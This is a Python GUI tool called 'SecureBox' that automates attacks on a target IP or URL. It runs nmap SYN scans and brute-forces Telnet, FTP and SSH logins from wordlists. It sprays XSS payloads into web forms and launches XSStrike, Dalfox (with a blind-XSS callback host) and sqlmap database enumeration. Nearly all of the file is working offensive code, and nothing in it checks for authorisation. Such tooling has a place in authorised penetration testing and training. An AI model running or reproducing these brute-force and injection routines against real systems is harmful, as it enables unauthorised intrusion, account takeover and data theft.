# Copyright (c) 2024 M0stafa0x10
# All rights reserved.
# Unauthorized use of this code is strictly prohibited.
# For permissions, contact: [engmostafa.mohamed9@gmail.com]

import asyncio
import telnetlib
import ftplib
import paramiko
import logging
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import subprocess
import nmap
from fpdf import FPDF
from tkinter.scrolledtext import ScrolledText
import json
import os

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class SecureBoxApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SecureBox - Automated Cybersecurity Tool")
        self.root.geometry("900x750")

        # Shared Data
        self.target_ip = tk.StringVar()
        self.target_url = tk.StringVar()
        self.username_file = tk.StringVar()
        self.password_file = tk.StringVar()
        self.payload_file = tk.StringVar()  # New variable for payload file
        self.final_report = ""
        self.exploit_details = ""

        # Setup UI
        self.setup_ui()

    def setup_ui(self):
        ttk.Label(self.root, text="SecureBox - Cybersecurity Tool", font=("Arial", 20, "bold")).pack(pady=10)

        # Tabbed Interface
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill="both", expand=True)

        # Tabs
        self.init_main_tab(notebook)
        self.init_exploit_tab(notebook)
        self.init_report_tab(notebook)

    def init_main_tab(self, notebook):
        main_tab = ttk.Frame(notebook)
        notebook.add(main_tab, text="Port Scanning & Exploitation")

        # Target IP Input
        ttk.Label(main_tab, text="Target IP for Scanning:").pack(pady=5)
        ttk.Entry(main_tab, textvariable=self.target_ip, width=60).pack(pady=5)

        # File Uploads
        ttk.Label(main_tab, text="Upload Username File:").pack(pady=5)
        ttk.Entry(main_tab, textvariable=self.username_file, width=50).pack(pady=5)
        ttk.Button(main_tab, text="Browse", command=self.browse_username_file).pack(pady=5)

        ttk.Label(main_tab, text="Upload Password File:").pack(pady=5)
        ttk.Entry(main_tab, textvariable=self.password_file, width=50).pack(pady=5)
        ttk.Button(main_tab, text="Browse", command=self.browse_password_file).pack(pady=5)

        # Action Buttons
        button_frame = ttk.Frame(main_tab)
        button_frame.pack(pady=20)
        ttk.Button(button_frame, text="Port Scanning", command=self.port_scanning).grid(row=0, column=0, padx=10, pady=5)
        ttk.Button(button_frame, text="Exploit Open Ports", command=self.exploit_ports).grid(row=1, column=0, padx=10, pady=5)

    def init_exploit_tab(self, notebook):
        exploit_tab = ttk.Frame(notebook)
        notebook.add(exploit_tab, text="Web Scanning & Exploitation")

        # Exploitation Buttons
        ttk.Button(exploit_tab, text="SQL Injection", command=self.run_sql_injection).pack(pady=10)
        ttk.Button(exploit_tab, text="XSS Injection", command=self.show_xss_functions).pack(pady=10)

    def init_report_tab(self, notebook):
        report_tab = ttk.Frame(notebook)
        notebook.add(report_tab, text="Reports")

        ttk.Label(report_tab, text="Generate Final Report").pack(pady=10)
        ttk.Button(report_tab, text="Generate PDF Report", command=self.generate_report).pack(pady=10)

    def browse_username_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.username_file.set(file_path)

    def browse_password_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.password_file.set(file_path)

    def port_scanning(self):
        target_ip = self.target_ip.get()
        if not target_ip:
            messagebox.showerror("Input Error", "Please enter a target IP.")
            return

        threading.Thread(target=self.run_nmap_scan, args=(target_ip,)).start()

    def run_nmap_scan(self, target_ip):
        try:
            scanner = nmap.PortScanner()
            scanner.scan(target_ip, arguments="-sS -sV -T4")
            result = f"Scanning {target_ip}...\n"
            for port in scanner[target_ip]['tcp']:
                state = scanner[target_ip]['tcp'][port]['state']
                service = scanner[target_ip]['tcp'][port].get('name', 'unknown')
                version = scanner[target_ip]['tcp'][port].get('version', 'unknown')
                result += f"Port: {port}, State: {state}, Service: {service}, Version: {version}\n"
            self.final_report += "\n[Port Scanning]\n" + result
            self.display_result("Port Scan Results", result)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {str(e)}")

    def display_result(self, title, result):
        result_window = tk.Toplevel(self.root)
        result_window.title(title)
        text_box = tk.Text(result_window, wrap=tk.WORD, height=20, width=80)
        text_box.pack(padx=10, pady=10)
        text_box.insert("1.0", result)
        text_box.config(state="disabled")

    def exploit_ports(self):
        target_ip = self.target_ip.get()
        if not target_ip:
            messagebox.showerror("Input Error", "Please enter a target IP.")
            return
        threading.Thread(target=self.run_port_exploitation, args=(target_ip,)).start()

    async def exploit_telnet(self, ip, username, password):
        try:
            tn = telnetlib.Telnet(ip, timeout=5)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            response = tn.read_all().decode('ascii')
            if "login incorrect" not in response.lower():
                return f'Telnet Success! Username: {username}, Password: {password}'
        except Exception as e:
            logging.error(f"Telnet exploit failed: {e}")
        return f'Telnet Failed: Username: {username}, Password: {password}'

    async def exploit_ftp(self, ip, username, password):
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login(user=username, passwd=password)
                return f'FTP Success! Username: {username}, Password: {password}'
        except ftplib.error_perm:
            return f'FTP Failed: Username: {username}, Password: {password}'
        except Exception as e:
            logging.error(f"FTP exploit failed: {e}")
        return f'FTP Failed: Username: {username}, Password: {password}'

    async def exploit_ssh(self, ip, username, password):
        try:
            with paramiko.SSHClient() as client:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=username, password=password, timeout=5)
                return f'SSH Success! Username: {username}, Password: {password}'
        except paramiko.AuthenticationException:
            return f'SSH Failed: Username: {username}, Password: {password}'
        except Exception as e:
            logging.error(f"SSH exploit failed: {e}")
        return f'SSH Failed: Username: {username}, Password: {password}'

    async def attempt_exploit(self, ip, username, password):
        semaphore = asyncio.Semaphore(10)  # Limit concurrency to 10

        async with semaphore:
            results = await asyncio.gather(
                self.exploit_telnet(ip, username, password),
                self.exploit_ftp(ip, username, password),
                self.exploit_ssh(ip, username, password),
                return_exceptions=True
            )
            return [res for res in results if res]

    def run_port_exploitation(self, target_ip):
        result_window = tk.Toplevel(self.root)
        result_window.title("Port Exploitation - Attempted Logins")
        text_box = tk.Text(result_window, wrap=tk.WORD, height=30, width=90)
        text_box.pack(padx=10, pady=10)
        text_box.insert("1.0", "Starting exploitation attempts...\n")

        self.final_report += "\n[Port Exploitation Results]\n"

        try:
            with open(self.username_file.get(), "r") as uf:
                usernames = [line.strip() for line in uf.readlines()]
        except FileNotFoundError:
            messagebox.showerror("Error", "Username file not found.")
            result_window.destroy()
            return

        try:
            with open(self.password_file.get(), "r") as pf:
                passwords = [line.strip() for line in pf.readlines()]
        except FileNotFoundError:
            messagebox.showerror("Error", "Password file not found.")
            result_window.destroy()
            return

        async def run_exploitation():
            tasks = [
                self.attempt_exploit(target_ip, username, password)
                for username in usernames
                for password in passwords
            ]
            semaphore = asyncio.Semaphore(20)  # Limit concurrent exploit attempts

            async with semaphore:
                for future in asyncio.as_completed(tasks):
                    results = await future
                    for result in results:
                        text_box.insert("end", f"{result}\n")
                        if "Success" in result:
                            self.exploit_details += f"{result}\n"
                            self.final_report += f"{result}\n"
                        text_box.see("end")
                        text_box.update_idletasks()

            result_window.destroy()
            messagebox.showinfo("Port Exploitation", "Port exploitation attempts completed.")

        asyncio.run(run_exploitation())

    def run_sql_injection(self):
        sql_injection_window = tk.Toplevel(self.root)
        sql_injection_app = SQLInjectionTool(sql_injection_window)

    def show_xss_functions(self):
        xss_functions_window = tk.Toplevel(self.root)
        xss_functions_window.title("XSS Injection")
        xss_functions_window.geometry("600x400")

        # Target URL
        ttk.Label(xss_functions_window, text="Target URL:").pack(pady=(20, 5))
        self.url_entry = ttk.Entry(xss_functions_window, width=50)
        self.url_entry.pack(pady=(0, 10))

        # Choose Payload File Button
        ttk.Button(xss_functions_window, text="Choose Payload File", command=self.choose_payload_file).pack(pady=5)
        self.payload_file_label = ttk.Label(xss_functions_window, text="No file selected")
        self.payload_file_label.pack(pady=(0, 10))

        # Checkboxes in a single line
        checkbox_frame = ttk.Frame(xss_functions_window)
        checkbox_frame.pack(pady=5)

        self.xsstrike_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(checkbox_frame, text="Run XSStrike", variable=self.xsstrike_var).pack(side=tk.LEFT, padx=5)

        self.dalfox_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(checkbox_frame, text="Run Dalfox", variable=self.dalfox_var).pack(side=tk.LEFT, padx=5)

        # Start Button
        ttk.Button(xss_functions_window, text="Start", command=self.start_xss_scan).pack(pady=10)

        # Output Text Area
        self.output_text = ScrolledText(xss_functions_window, wrap=tk.WORD, height=12)
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

    def choose_payload_file(self):
        payload_file = filedialog.askopenfilename(title="Select Payload File", filetypes=[("Text Files", "*.txt")])
        if payload_file:
            self.payload_file_label.config(text=payload_file)
            self.payload_file.set(payload_file)  # Set the payload file path
        else:
            self.payload_file_label.config(text="No file selected")

    def start_xss_scan(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return

        payload_file = self.payload_file_label.cget("text")
        if payload_file == "No file selected":
            messagebox.showerror("Error", "Please select a payload file")
            return

        try:
            self.log_message("Starting manual XSS scan...")
            xss_payloads = self.load_payloads(payload_file)
            if not xss_payloads:
                messagebox.showerror("Error", "Payload file is empty or invalid")
                return

            # Run manual scan
            response = requests.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")

            for form in forms:
                self.test_form(url, form, xss_payloads)

            self.dom_based_scan(url, xss_payloads)
            self.log_message("Manual scan completed.")

            # Run optional tools if selected
            if self.xsstrike_var.get():
                self.log_message("\nStarting XSStrike scan...")
                self.run_xsstrike(url)

            if self.dalfox_var.get():
                self.log_message("\nStarting Dalfox scan...")
                self.run_dalfox(url)

            self.log_message("\nAll selected scans completed. Check results files for details.")
        except Exception as e:
            self.log_message(f"An error occurred: {e}")

    def load_payloads(self, file_path):
        with open(file_path, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
        return payloads

    def test_form(self, url, form, xss_payloads):
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(url, action)

        inputs = form.find_all(["input", "textarea", "select"])
        for payload in xss_payloads:
            data = {}
            for input_tag in inputs:
                input_name = input_tag.get("name")
                if input_name:
                    data[input_name] = payload

            try:
                if method == "post":
                    response = requests.post(form_url, data=data)
                else:
                    response = requests.get(form_url, params=data)

                if payload in response.text:
                    result = {
                        "status": "XSS Found",
                        "payload": payload,
                        "form_url": form_url
                    }
                    self.log_result("results.json", result)
                    self.log_message(result)
            except requests.RequestException as e:
                self.log_message(f"[!] Error while testing form: {e}")

    def dom_based_scan(self, url, xss_payloads):
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, "html.parser")

            scripts = soup.find_all("script")
            for script in scripts:
                script_content = script.string
                if script_content and any(payload in script_content for payload in xss_payloads):
                    result = {
                        "status": "Potential DOM XSS Found",
                        "script_content": script_content.strip()[:100],
                        "url": url
                    }
                    self.log_result("dom_results.json", result)
                    self.log_message(result)
        except requests.RequestException as e:
            self.log_message(f"[!] Error during DOM analysis: {e}")

    def run_xsstrike(self, url):
        xsstrike_path = os.path.expanduser("/home/kali/Desktop/XSStrike/xsstrike.py")
        if not os.path.exists(xsstrike_path):
            self.log_message(f"[!] XSStrike not found at {xsstrike_path}")
            return

        try:
            result = subprocess.run(
                ["python3", xsstrike_path, "-u", url, "--crawl", "--skip"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                self.log_message("[+] XSStrike completed successfully:")
                self.log_message(result.stdout)
                with open("xsstrike_results.txt", "w") as f:
                    f.write(result.stdout)
            else:
                self.log_message(f"[!] XSStrike encountered an error:\n{result.stderr}")
        except Exception as e:
            self.log_message(f"[!] Error while running XSStrike: {e}")

    def run_dalfox(self, url):
        dalfox_path = "/snap/bin/dalfox"
        if not os.path.exists(dalfox_path):
            self.log_message(f"[!] Dalfox not found at {dalfox_path}")
            return

        try:
            result = subprocess.run(
                [dalfox_path, "url", url, "-b", "http://your-collab-server"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                self.log_message("[+] Dalfox completed successfully:")
                self.log_message(result.stdout)
                with open("dalfox_results.txt", "w") as f:
                    f.write(result.stdout)
            else:
                self.log_message(f"[!] Dalfox encountered an error:\n{result.stderr}")
        except Exception as e:
            self.log_message(f"[!] Error while running Dalfox: {e}")

    def log_result(self, file_path, data):
        with open(file_path, "a") as file:
            file.write(json.dumps(data, indent=4) + "\n")

    def log_message(self, message):
        if isinstance(message, dict):
            message = json.dumps(message, indent=4)
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.see(tk.END)

    def generate_report(self):
        if not self.final_report:
            messagebox.showerror("Error", "No results to generate report.")
            return

        try:
            pdf = FPDF()
            pdf.set_auto_page_break(auto=True, margin=15)
            pdf.add_page()
            pdf.set_font("Arial", size=12)
            pdf.multi_cell(0, 10, self.final_report)
            file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
            if file_path:
                pdf.output(file_path)
                messagebox.showinfo("Report Generated", "Report has been successfully generated.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate report: {str(e)}")


class SQLInjectionTool:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Tool")
        self.root.geometry("800x600")  # Set initial size
        self.root.minsize(600, 400)  # Set minimum size
        self.url = ""
        self.payloads = []
        self.request_file = ""
        self.save_results = tk.BooleanVar(value=False)  # Variable to save results
        self.setup_gui()

    def setup_gui(self):
        # Configure root window to be resizable
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky="nsew")

        # Configure main frame grid
        main_frame.columnconfigure(1, weight=1)  # Make second column expandable
        main_frame.rowconfigure(3, weight=1)  # Make output row expandable

        # URL Entry Frame
        url_frame = ttk.Frame(main_frame)
        url_frame.grid(row=0, column=0, columnspan=2, sticky="ew", pady=(0, 10))
        url_frame.columnconfigure(1, weight=1)

        ttk.Label(url_frame, text="Website URL:").grid(row=0, column=0, sticky="w", padx=(0, 5))
        self.url_entry = ttk.Entry(url_frame)
        self.url_entry.grid(row=0, column=1, sticky="ew")

        # Save Results Checkbox
        ttk.Checkbutton(main_frame, text="Save Results", variable=self.save_results).grid(row=1, column=0, columnspan=2, sticky="w")

        # Buttons Frame
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(0, 10))
        buttons_frame.columnconfigure((0, 1, 2, 3), weight=1)

        # Testing Buttons with equal spacing
        manual_btn = ttk.Button(buttons_frame, text="Manual Testing", command=self.run_manual_testing)
        manual_btn.grid(row=0, column=0, sticky="ew", padx=5)

        auto_btn = ttk.Button(buttons_frame, text="Automatic Testing", command=self.run_automatic_testing)
        auto_btn.grid(row=0, column=1, sticky="ew", padx=5)

        load_request_btn = ttk.Button(buttons_frame, text="Load Request File", command=self.load_request_file)
        load_request_btn.grid(row=0, column=2, sticky="ew", padx=5)

        load_payloads_btn = ttk.Button(buttons_frame, text="Load Payloads", command=self.load_payloads)
        load_payloads_btn.grid(row=0, column=3, sticky="ew", padx=5)

        # Status Frame
        status_frame = ttk.LabelFrame(main_frame, text="Status", padding="5")
        status_frame.grid(row=3, column=0, columnspan=2, sticky="ew", pady=(0, 10))
        status_frame.columnconfigure(0, weight=1)

        self.status_label = ttk.Label(status_frame, text="Ready")
        self.status_label.grid(row=0, column=0, sticky="w")

        # Output Frame
        output_frame = ttk.LabelFrame(main_frame, text="Output", padding="5")
        output_frame.grid(row=4, column=0, columnspan=2, sticky="nsew")
        output_frame.columnconfigure(0, weight=1)
        output_frame.rowconfigure(0, weight=1)

        # Output Text with Scrollbars
        self.output_text = tk.Text(output_frame, wrap=tk.WORD)
        self.output_text.grid(row=0, column=0, sticky="nsew")

        # Vertical Scrollbar
        v_scrollbar = ttk.Scrollbar(output_frame, orient=tk.VERTICAL, command=self.output_text.yview)
        v_scrollbar.grid(row=0, column=1, sticky="ns")
        self.output_text.configure(yscrollcommand=v_scrollbar.set)

        # Horizontal Scrollbar
        h_scrollbar = ttk.Scrollbar(output_frame, orient=tk.HORIZONTAL, command=self.output_text.xview)
        h_scrollbar.grid(row=1, column=0, sticky="ew")
        self.output_text.configure(xscrollcommand=h_scrollbar.set)

    def update_status(self, message):
        self.status_label.config(text=message)
        self.root.update_idletasks()

    def log_output(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)
        self.root.update_idletasks()

    def run_manual_testing(self):
        if not self.request_file:
            messagebox.showerror("Error", "Please load a request file first.")
            return

        self.update_status("Running manual testing...")
        threading.Thread(target=self._manual_testing_thread).start()

    def _manual_testing_thread(self):
        try:
            self.log_output("[+] Starting manual testing...")
            result = subprocess.run(
                ["sqlmap", "-r", self.request_file, "--batch"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            self.log_output(result.stdout)
            if "vulnerable" in result.stdout:
                self.log_output("[!] SQL Injection vulnerability detected.")
                if self.save_results.get():
                    with open("manual_testing_results.txt", "a") as f:
                        f.write(result.stdout)
            self.update_status("Manual testing completed")
        except FileNotFoundError:
            self.log_output("[!] sqlmap is not installed or not found in PATH.")
            self.update_status("Error: sqlmap not found")
        except Exception as e:
            self.log_output(f"[!] Error during manual testing: {str(e)}")
            self.update_status("Error occurred")

    def run_automatic_testing(self):
        if not self.request_file:
            messagebox.showerror("Error", "Please load a request file first.")
            return

        self.update_status("Running automatic testing...")
        threading.Thread(target=self._automatic_testing_thread).start()

    def _automatic_testing_thread(self):
        try:
            self.log_output("[+] Starting automatic testing with sqlmap...")
            result = subprocess.run(
                ["sqlmap", "-r", self.request_file, "--dbs", "--batch"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            self.log_output(result.stdout)
            if "available databases" in result.stdout:
                self.log_output("[+] Databases retrieved successfully.")
                if self.save_results.get():
                    with open("automatic_testing_results.txt", "a") as f:
                        f.write(result.stdout)
            self.update_status("Automatic testing completed")
        except FileNotFoundError:
            self.log_output("[!] sqlmap is not installed or not found in PATH.")
            self.update_status("Error: sqlmap not found")
        except Exception as e:
            self.log_output(f"[!] Error during automatic testing: {str(e)}")
            self.update_status("Error occurred")

    def load_request_file(self):
        request_file = filedialog.askopenfilename(title="Select Request File", filetypes=[("Text Files", "*.txt")])
        if request_file:
            self.request_file = request_file
            self.log_output(f"[+] Loaded request file: {self.request_file}")
            self.update_status("Request file loaded")
        else:
            self.log_output("[!] No request file selected.")
            self.update_status("Ready")

    def load_payloads(self):
        payload_file = filedialog.askopenfilename(title="Select Payload File", filetypes=[("Text Files", "*.txt")])
        if payload_file:
            try:
                with open(payload_file, "r") as f:
                    self.payloads = f.read().splitlines()
                self.log_output(f"[+] Loaded {len(self.payloads)} payloads from {payload_file}.")
                self.update_status("Payloads loaded")
            except Exception as e:
                self.log_output(f"[!] Error loading payloads: {e}")
                self.update_status("Error loading payloads")
        else:
            self.log_output("[!] No payload file selected.")
            self.update_status("Ready")

if __name__ == "__main__":
    root = tk.Tk()
    app = SecureBoxApp(root)
    root.mainloop() 
